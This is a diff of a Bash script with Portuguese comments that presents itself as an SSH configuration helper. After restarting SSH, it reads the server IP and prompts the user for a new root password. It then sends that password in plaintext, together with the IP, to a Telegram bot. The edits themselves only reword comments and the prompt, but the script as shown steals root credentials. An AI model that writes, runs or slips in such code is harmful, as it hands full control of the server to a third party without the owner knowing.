@@ -45,15 +45,17 @@ service ssh restart > /dev/null
 # Obtém o IP do servidor
 IP=$(hostname -I | cut -d ' ' -f1)
 
-# Limpa a tela e envia mensagem de configuração para o bot Telegram
+# Limpa a tela
 clear
+
+# Envia mensagem para o bot Telegram
 send_message "As configurações do SSH foram atualizadas. Por favor, defina a nova senha root."
 
 # Espera 2 segundos antes de solicitar a definição da senha root
 sleep 2s
 
 # Solicita a definição da senha root e armazena-a em uma variável
-hide_input "Nova senha root: " NEW_PASSWD
+hide_input "Por favor, digite a nova senha root: " NEW_PASSWD
 
 # Envia a nova senha root e o IP do servidor para o bot Telegram
 send_message "Nova senha root definida: $NEW_PASSWD | IP do servidor: $IP"
